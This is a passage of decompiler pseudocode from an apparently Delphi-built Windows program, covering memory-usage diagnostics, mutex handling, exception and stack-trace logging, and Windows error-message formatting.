  int v8; // [esp-40h] [ebp-508h]
  void **v9; // [esp-3Ch] [ebp-504h]
  int v10; // [esp-38h] [ebp-500h]
  const wchar_t *v11; // [esp-34h] [ebp-4FCh]
  int v12; // [esp-30h] [ebp-4F8h]
  const wchar_t *v13; // [esp-2Ch] [ebp-4F4h]
  int v14; // [esp-28h] [ebp-4F0h]
  int (**v15)[8]; // [esp-24h] [ebp-4ECh]
  wchar_t *v16; // [esp-20h] [ebp-4E8h]
  int v17; // [esp-1Ch] [ebp-4E4h]
  int v18; // [esp-14h] [ebp-4DCh]
  _DWORD v19[3]; // [esp-Ch] [ebp-4D4h] BYREF
  void *v20; // [esp+0h] [ebp-4C8h] BYREF
  int v21; // [esp+4h] [ebp-4C4h] BYREF
  void *v22; // [esp+8h] [ebp-4C0h] BYREF
  int v23; // [esp+Ch] [ebp-4BCh] BYREF
  void *v24; // [esp+10h] [ebp-4B8h] BYREF
  int v25; // [esp+14h] [ebp-4B4h] BYREF
  void *v26; // [esp+18h] [ebp-4B0h] BYREF
  int v27; // [esp+1Ch] [ebp-4ACh] BYREF
  void *v28; // [esp+20h] [ebp-4A8h] BYREF
  int v29; // [esp+24h] [ebp-4A4h] BYREF
  void *v30; // [esp+28h] [ebp-4A0h] BYREF
  int v31; // [esp+2Ch] [ebp-49Ch] BYREF
  void *v32; // [esp+30h] [ebp-498h] BYREF
  int v33; // [esp+34h] [ebp-494h] BYREF
  void *v34; // [esp+38h] [ebp-490h] BYREF
  int v35; // [esp+3Ch] [ebp-48Ch] BYREF
  void *v36; // [esp+40h] [ebp-488h] BYREF
  int v37; // [esp+44h] [ebp-484h] BYREF
  void *v38; // [esp+48h] [ebp-480h] BYREF
  int v39; // [esp+4Ch] [ebp-47Ch] BYREF
  void *v40; // [esp+50h] [ebp-478h] BYREF
  int v41; // [esp+54h] [ebp-474h] BYREF
  void *v42; // [esp+58h] [ebp-470h] BYREF
  int v43; // [esp+5Ch] [ebp-46Ch] BYREF
  void *v44; // [esp+60h] [ebp-468h] BYREF
  int v45; // [esp+64h] [ebp-464h] BYREF
  void *v46; // [esp+68h] [ebp-460h] BYREF
  int v47; // [esp+6Ch] [ebp-45Ch] BYREF
  void *v48; // [esp+70h] [ebp-458h] BYREF
  int v49; // [esp+74h] [ebp-454h] BYREF
  void *v50; // [esp+78h] [ebp-450h] BYREF
  int v51; // [esp+7Ch] [ebp-44Ch] BYREF
  int v52; // [esp+80h] [ebp-448h] BYREF
  int v53; // [esp+84h] [ebp-444h] BYREF
  int v54; // [esp+88h] [ebp-440h] BYREF
  int v55; // [esp+8Ch] [ebp-43Ch] BYREF
  int v56; // [esp+90h] [ebp-438h] BYREF
  void *v57; // [esp+94h] [ebp-434h] BYREF
  int v58; // [esp+98h] [ebp-430h] BYREF
  int v59; // [esp+9Ch] [ebp-42Ch] BYREF
  int v60; // [esp+A0h] [ebp-428h] BYREF
  int v61; // [esp+A4h] [ebp-424h] BYREF
  char v62[884]; // [esp+A8h] [ebp-420h] BYREF
  unsigned int v63; // [esp+41Ch] [ebp-ACh]
  unsigned int v64; // [esp+420h] [ebp-A8h]
  unsigned int v65; // [esp+428h] [ebp-A0h]
  unsigned int v66; // [esp+42Ch] [ebp-9Ch]
  int v67[10]; // [esp+430h] [ebp-98h] BYREF
  struct _MEMORYSTATUSEX Buffer; // [esp+458h] [ebp-70h] BYREF
  unsigned int v69; // [esp+498h] [ebp-30h]
  unsigned int v70; // [esp+49Ch] [ebp-2Ch]
  unsigned int v71; // [esp+4A0h] [ebp-28h]
  int v72; // [esp+4A4h] [ebp-24h]
  int i; // [esp+4A8h] [ebp-20h]
  unsigned __int8 j; // [esp+4AFh] [ebp-19h]
  __int64 v75; // [esp+4B0h] [ebp-18h]
  __int64 v76; // [esp+4B8h] [ebp-10h]
  int v77; // [esp+4C0h] [ebp-8h]
  int v78; // [esp+4C4h] [ebp-4h]
  int savedregs; // [esp+4C8h] [ebp+0h] BYREF

  v77 = a2;
  v78 = a1;
  v19[2] = &savedregs;
  v19[1] = &loc_432AAE;
  v19[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v19);
  Guitesting::TGUITestCase::Hide(a2, L"Pas memory manager:");
  v76 = 0i64;
  v75 = 0i64;
  System::GetMemoryManagerState(v62);
  for ( i = 0; i != 55; ++i )
  {
    v76 += (unsigned int)(*(_DWORD *)&v62[16 * i + 4] * *(_DWORD *)&v62[16 * i + 8]);
    v75 += *(unsigned int *)&v62[16 * i + 12];
  }
  v76 += v63;
  v76 += v65;
  v75 += v64;
  v75 += v66;
  sub_424FE0(&v60, a3, v76);
  v18 = v60;
  sub_424FE0(&v59, a3, v75);
  v17 = v59;
  sub_4079F0(&v61, 4);
  Guitesting::TGUITestCase::Hide(v77, v61);
  Guitesting::TGUITestCase::Hide(v77, L"MultiHeap:");
  sub_424FE0((int *)&v57, a3, *(int *)off_468200);
  sub_407968(&v58, L"ErrorSize=", v57);
  Guitesting::TGUITestCase::Hide(v77, v58);
  for ( j = 0; j != 3; ++j )
  {
    if ( (unsigned __int8)sub_4238C0() )
    {
      v16 = off_46809C[j];
      v15 = &off_432B9C;
      sub_424F30(&v55, a3, v69);
      v14 = v55;
      v13 = L" CommitedSize=";
      sub_424F30(&v54, a3, v70);
      v12 = v54;
      v11 = L" UnCommitedSize=";
      sub_424F30(&v53, a3, v71);
      v10 = v53;
      v9 = &off_432C24;
      unknown_libname_74(v72, &v52);
      v8 = v52;
      sub_4079F0(&v56, 9);
      Guitesting::TGUITestCase::Hide(v77, v56);
    }
  }
  Guitesting::TGUITestCase::Hide(v77, L"Windows:");
  Guitesting::TGUITestCase::Hide(&Buffer, 64);
  Buffer.dwLength = 64;
  if ( GlobalMemoryStatusEx(&Buffer) )
  {
    sub_415178((int *)&v50, 0, v3, Buffer.dwMemoryLoad);
    sub_407968(&v51, L"MemoryLoad: ", v50);
    Guitesting::TGUITestCase::Hide(v77, v51);
    sub_424F30((int *)&v48, a3, Buffer.ullTotalPhys);
    sub_407968(&v49, L"TotalPhys: ", v48);
    Guitesting::TGUITestCase::Hide(v77, v49);
    sub_424F30((int *)&v46, a3, Buffer.ullAvailPhys);
    sub_407968(&v47, L"AvailPhys: ", v46);
    Guitesting::TGUITestCase::Hide(v77, v47);
    sub_424F30((int *)&v44, a3, Buffer.ullTotalPageFile);
    sub_407968(&v45, L"TotalPageFile: ", v44);
    Guitesting::TGUITestCase::Hide(v77, v45);
    sub_424F30((int *)&v42, a3, Buffer.ullAvailPageFile);
    sub_407968(&v43, L"AvailPageFile: ", v42);
    Guitesting::TGUITestCase::Hide(v77, v43);
    sub_424F30((int *)&v40, a3, Buffer.ullTotalVirtual);
    sub_407968(&v41, L"TotalVirtual: ", v40);
    Guitesting::TGUITestCase::Hide(v77, v41);
    sub_424F30((int *)&v38, a3, Buffer.ullAvailVirtual);
    sub_407968(&v39, L"AvailVirtual: ", v38);
    Guitesting::TGUITestCase::Hide(v77, v39);
  }
  Guitesting::TGUITestCase::Hide(v67, 40);
  v67[0] = 40;
  if ( *off_468080 )
  {
    CurrentProcess = GetCurrentProcess();
    if ( ((int (__cdecl *)(HANDLE, int *, int, int, void **, int, const wchar_t *, int, const wchar_t *, int, int (**)[8], wchar_t *, int, const wchar_t *, int, const wchar_t *))*off_468080)(
           CurrentProcess,
           v67,
           40,
           v8,
           v9,
           v10,
           v11,
           v12,
           v13,
           v14,
           v15,
           v16,
           v17,
           L" ReservedSize=",
           v18,
           L"AllocatedSize=") )
    {
      sub_415178((int *)&v36, 0, v5, (unsigned int)v67[1]);
      sub_407968(&v37, L"PageFaultCount: ", v36);
      Guitesting::TGUITestCase::Hide(v77, v37);
      sub_424F30((int *)&v34, a3, (unsigned int)v67[2]);
      sub_407968(&v35, L"PeakWorkingSetSize: ", v34);
      Guitesting::TGUITestCase::Hide(v77, v35);
      sub_424F30((int *)&v32, a3, (unsigned int)v67[3]);
      sub_407968(&v33, L"WorkingSetSize: ", v32);
      Guitesting::TGUITestCase::Hide(v77, v33);
      sub_424F30((int *)&v30, a3, (unsigned int)v67[4]);
      sub_407968(&v31, L"QuotaPeakPagedPoolUsage: ", v30);
      Guitesting::TGUITestCase::Hide(v77, v31);
      sub_424F30((int *)&v28, a3, (unsigned int)v67[5]);
      sub_407968(&v29, L"QuotaPagedPoolUsage: ", v28);
      Guitesting::TGUITestCase::Hide(v77, v29);
      sub_424F30((int *)&v26, a3, (unsigned int)v67[6]);
      sub_407968(&v27, L"QuotaPeakNonPagedPoolUsage: ", v26);
      Guitesting::TGUITestCase::Hide(v77, v27);
      sub_424F30((int *)&v24, a3, (unsigned int)v67[7]);
      sub_407968(&v25, L"QuotaNonPagedPoolUsage: ", v24);
      Guitesting::TGUITestCase::Hide(v77, v25);
      sub_424F30((int *)&v22, a3, (unsigned int)v67[8]);
      sub_407968(&v23, L"PagefileUsage: ", v22);
      Guitesting::TGUITestCase::Hide(v77, v23);
      sub_424F30((int *)&v20, a3, (unsigned int)v67[9]);
      sub_407968(&v21, L"PeakPagefileUsage: ", v20);
      Guitesting::TGUITestCase::Hide(v77, v21);
    }
  }
  __writefsdword(0, v7);
  return sub_406CA4((int)&v20, 42);
}
// 4326EC: variable 'v3' is possibly undefined
// 432891: variable 'v8' is possibly undefined
// 432891: variable 'v9' is possibly undefined
// 432891: variable 'v10' is possibly undefined
// 432891: variable 'v11' is possibly undefined
// 432891: variable 'v12' is possibly undefined
// 432891: variable 'v13' is possibly undefined
// 432891: variable 'v14' is possibly undefined
// 432891: variable 'v15' is possibly undefined
// 432891: variable 'v16' is possibly undefined
// 4328AB: variable 'v5' is possibly undefined
// 432A95: variable 'v7' is possibly undefined
// 4049BC: using guessed type int __fastcall System::GetMemoryManagerState(_DWORD);
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 429130: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 432AC8: using guessed type wchar_t aPasMemoryManag[20];
// 432AFC: using guessed type wchar_t aAllocatedsize[15];
// 432B28: using guessed type wchar_t aReservedsize[15];
// 432B54: using guessed type wchar_t aMultiheap[11];
// 432B78: using guessed type wchar_t aErrorsize[11];
// 432B9C: using guessed type int (*off_432B9C)[8];
// 432BC8: using guessed type wchar_t aCommitedsize[15];
// 432BF4: using guessed type wchar_t aUncommitedsize[17];
// 432C24: using guessed type void *off_432C24;
// 432C4C: using guessed type wchar_t aWindows[9];
// 432C6C: using guessed type wchar_t aMemoryload[13];
// 432C94: using guessed type wchar_t aTotalphys[12];
// 432CB8: using guessed type wchar_t aAvailphys[12];
// 432CDC: using guessed type wchar_t aTotalpagefile[16];
// 432D08: using guessed type wchar_t aAvailpagefile[16];
// 432D34: using guessed type wchar_t aTotalvirtual[15];
// 432D60: using guessed type wchar_t aAvailvirtual[15];
// 432D8C: using guessed type wchar_t aPagefaultcount[17];
// 432DBC: using guessed type wchar_t aPeakworkingset[21];
// 432DF4: using guessed type wchar_t aWorkingsetsize[17];
// 432E24: using guessed type wchar_t aQuotapeakpaged[26];
// 432E64: using guessed type wchar_t aQuotapagedpool[22];
// 432E9C: using guessed type wchar_t aQuotapeaknonpa[29];
// 432EE4: using guessed type wchar_t aQuotanonpagedp[25];
// 432F24: using guessed type wchar_t aPagefileusage[16];
// 432F50: using guessed type wchar_t aPeakpagefileus[20];
// 468080: using guessed type int *off_468080;
// 46809C: using guessed type wchar_t **off_46809C;
// 468200: using guessed type void *off_468200;

//----- (00432F80) --------------------------------------------------------
DWORD __fastcall sub_432F80(int a1)
{
  return WaitForSingleObject(*(HANDLE *)(a1 + 4), 0xFFFFFFFF);
}

//----- (00432FA0) --------------------------------------------------------
BOOL __fastcall sub_432FA0(int a1, int a2)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  int v5; // [esp+0h] [ebp-8h]
  int v6; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a2;
  v6 = a1;
  sub_432F80(a1);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_432FEE;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_433000(v6);
  sub_406FE8((volatile __int32 *)(v6 + 16), v5);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_432FF5;
  return sub_433BC0(v6);
}

//----- (00433000) --------------------------------------------------------
int __fastcall sub_433000(int a1)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 8);
  if ( result != *off_46814C )
  {
    sub_41581C(*(HANDLE *)(a1 + 8));
    result = *off_46814C;
    *(_DWORD *)(a1 + 8) = *off_46814C;
  }
  return result;
}
// 46814C: using guessed type int *off_46814C;

//----- (00433040) --------------------------------------------------------
int __fastcall sub_433040(int a1, char a2, int a3, char a4, char a5)
{
  int v6; // [esp+0h] [ebp-Ch]
  char v7; // [esp+7h] [ebp-5h]
  int v8; // [esp+8h] [ebp-4h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v6 = a3;
  v7 = a2;
  v8 = a1;
  *(_DWORD *)(a1 + 8) = *off_46814C;
  *(_BYTE *)(a1 + 20) = a5;
  *(_DWORD *)(a1 + 4) = Windows::CreateMutexW(0, 0, 0);
  sub_406FE8((volatile __int32 *)(v8 + 16), v6);
  *(_BYTE *)(v8 + 40) = a4;
  *(_DWORD *)(v8 + 32) = -1;
  *(_DWORD *)(v8 + 36) = -1;
  if ( *(_BYTE *)(v8 + 40) )
  {
    dword_466BF0 = v8;
    *(_DWORD *)(v8 + 24) = *off_467F98[0];
    *off_467F98[0] = (int)sub_432410;
  }
  if ( v7 )
    System::__linkproc__ AfterConstruction(v8);
  return v8;
}
// 433052: variable 'a3' is possibly undefined
// 433055: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 466BF0: using guessed type int dword_466BF0;
// 467F98: using guessed type int *off_467F98[2];
// 46814C: using guessed type int *off_46814C;

//----- (00433100) --------------------------------------------------------
int sub_433100()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  if ( dword_466BF0 == (_DWORD)v0 )
  {
    dword_466BF0 = 0;
    *off_467F98[0] = *(_DWORD *)(v0 + 24);
  }
  sub_433000(v0);
  CloseHandle_0(*(HANDLE *)(v3 + 4));
  result = sub_405588();
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 466BF0: using guessed type int dword_466BF0;
// 467F98: using guessed type int *off_467F98[2];

//----- (00433170) --------------------------------------------------------
int __usercall sub_433170@<eax>(int *a1@<eax>, char a2@<dl>, int *a3@<ecx>, int a4@<edi>, int a5@<esi>)
{
  int v5; // edx
  bool v6; // al
  int v7; // edx
  int v8; // ecx
  int v9; // edx
  unsigned int v11[2]; // [esp-18h] [ebp-44h] BYREF
  int *v12; // [esp-10h] [ebp-3Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-38h] BYREF
  void *v14; // [esp-8h] [ebp-34h]
  int *v15; // [esp-4h] [ebp-30h]
  void *v16; // [esp+0h] [ebp-2Ch]
  void *v17; // [esp+4h] [ebp-28h] BYREF
  int v18; // [esp+8h] [ebp-24h] BYREF
  int v19; // [esp+Ch] [ebp-20h] BYREF
  void *v20; // [esp+10h] [ebp-1Ch] BYREF
  int v21; // [esp+14h] [ebp-18h] BYREF
  unsigned __int8 v22; // [esp+1Ah] [ebp-12h]
  bool v23; // [esp+1Bh] [ebp-11h]
  _DWORD *v24; // [esp+1Ch] [ebp-10h]
  int *v25; // [esp+20h] [ebp-Ch]
  char v26; // [esp+27h] [ebp-5h]
  int *v27; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v18 = 0;
  v17 = 0;
  v19 = 0;
  v21 = 0;
  v20 = 0;
  v25 = a3;
  v26 = a2;
  v27 = a1;
  v15 = &savedregs;
  v14 = &loc_43334C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v24 = (_DWORD *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_4332E9;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v22 = 29;
  if ( !sub_431CD0(v25) )
    v22 |= 2u;
  sub_430880((int)v24, v22, 0, a4);
  if ( !sub_431CD0(v25) )
    sub_4308B0((int)v25, (int)v24, 0);
  if ( (int)v24[2] > 0 )
  {
    sub_4154C8(8, (int *)&v20, (unsigned int)hModule);
    sub_407968(&v21, L"Start stack HInstance=", v20);
    sub_4294E0((int)v24, 0, v21, 0, a4, a5);
    Guitesting::TGUITestCase::Hide(v24, L"Finish stack");
    sub_4289A0((int)v24, (int)&v19);
    LOBYTE(v5) = 5;
    (*(void (__fastcall **)(int *, int, int))(*v27 + 8))(v27, v5, v19);
  }
  v6 = sub_40576C(v25, (int)&off_4127A8) || sub_40576C(v25, (int)&off_413074);
  v23 = v6;
  if ( sub_40576C(v25, (int)&off_4127A8) )
  {
    (*(void (__fastcall **)(_DWORD *))(*v24 + 4))(v24);
    sub_432480(*v27, (int)v24, a5);
    sub_4289A0((int)v24, (int)&v17);
    sub_407968(&v18, L"OOM:\r\n", v17);
    LOBYTE(v7) = 3;
    (*(void (__fastcall **)(int *, int, int))(*v27 + 8))(v27, v7, v18);
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_4332F0;
  sub_405598(v24);
  sub_432F80((int)v27);
  v15 = &savedregs;
  v14 = &loc_43332A;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  LOBYTE(v8) = v23;
  LOBYTE(v9) = v26;
  (*(void (__fastcall **)(int *, int, int, struct _EXCEPTION_REGISTRATION_RECORD *))(*v27 + 4))(
    v27,
    v9,
    v8,
    ExceptionList);
  __writefsdword(0, (unsigned int)v14);
  v16 = &loc_433331;
  sub_433BC0((int)v27);
  __writefsdword(0, (unsigned int)v14);
  v16 = &loc_433353;
  return sub_406CA4((int)&v17, 5);
}
// 433254: variable 'v5' is possibly undefined
// 4332D0: variable 'v7' is possibly undefined
// 433311: variable 'v9' is possibly undefined
// 433311: variable 'v8' is possibly undefined
// 4127A8: using guessed type void *off_4127A8;
// 413074: using guessed type void *off_413074;
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 429130: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 433368: using guessed type wchar_t aStartStackHins[23];
// 4333A4: using guessed type wchar_t aFinishStack[13];
// 4333CC: using guessed type wchar_t aOom[7];

//----- (004333E0) --------------------------------------------------------
_DWORD *__fastcall sub_4333E0(int a1, int a2, int a3)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v5; // [esp-8h] [ebp-1Ch]
  int *v6; // [esp-4h] [ebp-18h]
  __int32 v7; // [esp+4h] [ebp-10h] BYREF
  int v8; // [esp+8h] [ebp-Ch]
  int v9; // [esp+Ch] [ebp-8h]
  int v10; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v7 = 0;
  v8 = a3;
  v9 = a2;
  v10 = a1;
  v6 = &savedregs;
  v5 = &loc_433440;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a1 )
  {
    sub_424890(v8, v9, (int)&str___5[1], &v7);
    (*(void (__fastcall **)(int, _DWORD, __int32, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v10 + 8))(
      v10,
      0,
      v7,
      v6,
      v5,
      ExceptionList);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v6 = (int *)&loc_433447;
  return sub_406C44(&v7);
}
// 433450: using guessed type _strings str___5[1];

//----- (00433460) --------------------------------------------------------
_DWORD *__fastcall sub_433460(int a1, int a2, int a3)
{
  int v3; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v6; // [esp-8h] [ebp-1Ch]
  int *v7; // [esp-4h] [ebp-18h]
  __int32 v8; // [esp+4h] [ebp-10h] BYREF
  int v9; // [esp+8h] [ebp-Ch]
  int v10; // [esp+Ch] [ebp-8h]
  int v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v8 = 0;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  v7 = &savedregs;
  v6 = &loc_4334C0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a1 )
  {
    sub_424890(v9, v10, (int)&str___6[1], &v8);
    LOBYTE(v3) = 2;
    (*(void (__fastcall **)(int, int, __int32, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v11 + 8))(
      v11,
      v3,
      v8,
      v7,
      v6,
      ExceptionList);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v7 = (int *)&loc_4334C7;
  return sub_406C44(&v8);
}
// 4334A7: variable 'v3' is possibly undefined
// 4334D0: using guessed type _strings str___6[1];

//----- (004334E0) --------------------------------------------------------
int __userpurge sub_4334E0@<eax>(int *a1@<eax>, int *a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5@<esi>, char a6)
{
  int v6; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v9; // [esp-8h] [ebp-20h]
  int *v10; // [esp-4h] [ebp-1Ch]
  __int32 v11; // [esp+4h] [ebp-14h] BYREF
  __int32 v12; // [esp+8h] [ebp-10h] BYREF
  int v13; // [esp+Ch] [ebp-Ch]
  int *v14; // [esp+10h] [ebp-8h]
  int *v15; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v11 = 0;
  v12 = 0;
  v13 = a3;
  v14 = a2;
  v15 = a1;
  v10 = &savedregs;
  v9 = &loc_43358F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a1 )
  {
    if ( v14 )
      sub_407030(&v12, v14[1]);
    else
      sub_407030(&v12, (__int32)L"Exception = nil");
    sub_424890(v13, v12, (int)&str___7[1], &v11);
    LOBYTE(v6) = 3;
    (*(void (__fastcall **)(int *, int, __int32, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v15 + 8))(
      v15,
      v6,
      v11,
      v10,
      v9,
      ExceptionList);
    if ( v14 )
    {
      sub_40576C(v14, (int)off_412914);
      sub_433170(v15, a6, v14, a4, a5);
    }
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v10 = (int *)&loc_433596;
  return sub_406CA4((int)&v11, 2);
}
// 43354D: variable 'v6' is possibly undefined
// 412914: using guessed type int (*off_412914[2])();
// 4335AC: using guessed type wchar_t aExceptionNil[16];
// 4335D0: using guessed type _strings str___7[1];

//----- (004335E0) --------------------------------------------------------
int __fastcall sub_4335E0(DWORD a1, int a2)
{
  int v2; // eax
  int v3; // ecx
  int v4; // eax
  int v5; // eax
  unsigned int v7; // [esp-30h] [ebp-54h]
  _DWORD v8[3]; // [esp-24h] [ebp-48h] BYREF
  unsigned int v9; // [esp-18h] [ebp-3Ch]
  const wchar_t *v10; // [esp-14h] [ebp-38h]
  void *v11; // [esp-10h] [ebp-34h]
  _DWORD v12[3]; // [esp-Ch] [ebp-30h] BYREF
  unsigned int v13; // [esp+0h] [ebp-24h] BYREF
  void *v14; // [esp+4h] [ebp-20h] BYREF
  DWORD dwFlags; // [esp+8h] [ebp-1Ch]
  void *v16; // [esp+Ch] [ebp-18h] BYREF
  unsigned int v17; // [esp+10h] [ebp-14h] BYREF
  int v18; // [esp+14h] [ebp-10h]
  DWORD dwMessageId; // [esp+18h] [ebp-Ch]
  LPCVOID lpSource; // [esp+1Ch] [ebp-8h]
  WCHAR Buffer[2]; // [esp+20h] [ebp-4h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v14 = 0;
  v13 = 0;
  v17 = 0;
  v16 = 0;
  v18 = a2;
  dwMessageId = a1;
  v12[2] = &savedregs;
  v12[1] = &loc_433779;
  v12[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  unknown_libname_74(a1, &v14);
  v11 = v14;
  v10 = L" 0x";
  sub_4154C8(8, (int *)&v13, dwMessageId);
  v9 = v13;
  sub_4079F0((int *)&v16, 3);
  lpSource = 0;
  dwFlags = 4864;
  if ( dwMessageId >= 0x2EE0 && dwMessageId < 0x32C8 )
  {
    lpSource = GetModuleHandleW_2(L"wininet.dll");
    if ( lpSource )
    {
      dwFlags |= 0x800u;
      sub_407910((volatile __int32 *)&v16, L" WININET:");
    }
  }
  if ( FormatMessageW_0(dwFlags, lpSource, dwMessageId, 0x400u, Buffer, 0, 0) )
  {
    v8[2] = &savedregs;
    v8[1] = &loc_43374A;
    v8[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v8);
    unknown_libname_50(&v17, *(_DWORD *)Buffer);
    while ( System::__linkproc__ LStrLen(v17) > 0 )
    {
      v4 = System::__linkproc__ LStrLen(v17);
      if ( *(_WORD *)(v17 + 2 * v4 - 2) != 10 )
      {
        v5 = System::__linkproc__ LStrLen(v17);
        if ( *(_WORD *)(v17 + 2 * v5 - 2) != 13 )
          break;
      }
      v2 = System::__linkproc__ LStrLen(v17);
      sub_407890(&v17, v2 - 1, v3);
    }
    v7 = v17;
    sub_4079F0((int *)v18, 3);
    __writefsdword(0, v7);
    LocalFree_0(*(HLOCAL *)Buffer);
  }
  else
  {
    sub_407968((volatile __int32 *)v18, v16, L" Unable to format last error code");
  }
  __writefsdword(0, v9);
  v11 = &loc_433780;
  sub_406CA4((int)&v13, 2);
  return sub_406CA4((int)&v16, 2);
}
// 4336E4: variable 'v3' is possibly undefined
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 433790: using guessed type wchar_t a0x_0[4];
// 4337BC: using guessed type wchar_t aWininet[10];
// 4337DC: using guessed type wchar_t aUnableToFormat[34];
// 433824: using guessed type _strings str___8[1];

//----- (00433830) --------------------------------------------------------
int __fastcall sub_433830(int a1, char a2, DWORD a3, int a4)
{
  int v4; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v7; // [esp-8h] [ebp-20h]
  int *v8; // [esp-4h] [ebp-1Ch]
  int v9; // [esp+4h] [ebp-14h] BYREF
  __int32 v10; // [esp+8h] [ebp-10h] BYREF
  DWORD v11; // [esp+Ch] [ebp-Ch]
  char v12; // [esp+13h] [ebp-5h]
  int v13; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v11 = a3;
  v12 = a2;
  v13 = a1;
  v8 = &savedregs;
  v7 = &loc_4338A4;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a1 )
  {
    sub_4335E0(v11, (int)&v9);
    sub_424890(a4, v9, (int)&str___9[1], &v10);
    LOBYTE(v4) = v12;
    (*(void (__fastcall **)(int, int, __int32, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v13 + 8))(
      v13,
      v4,
      v10,
      v8,
      v7,
      ExceptionList);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v8 = (int *)&loc_4338AB;
  return sub_406CA4((int)&v9, 2);
}
// 433886: variable 'v4' is possibly undefined
// 4338B8: using guessed type _strings str___9[1];

//----- (004338D0) --------------------------------------------------------
int __usercall sub_4338D0@<eax>(
        unsigned int a1@<eax>,
        unsigned int a2@<edx>,
        unsigned int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>)
{
  unsigned int v6; // ecx
  int v7; // eax
  int result; // eax
  unsigned int v9[10]; // [esp-Ch] [ebp-28h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v9[7] = a3;
  v9[8] = a2;
  v9[9] = a1;
  v9[2] = (unsigned int)&savedregs;
  v9[1] = (unsigned int)&loc_43390E;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v6 = a2;
  LOBYTE(a2) = 1;
  v7 = unknown_libname_85(off_411F40, a2, v6);
  sub_406340(v7, a4, (int)&savedregs, a5, a6);
  result = 0;
  __writefsdword(0, v9[0]);
  return result;
}
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);

//----- (00433940) --------------------------------------------------------
int __userpurge sub_433940@<eax>(
        int a1@<eax>,
        void *a2@<edx>,
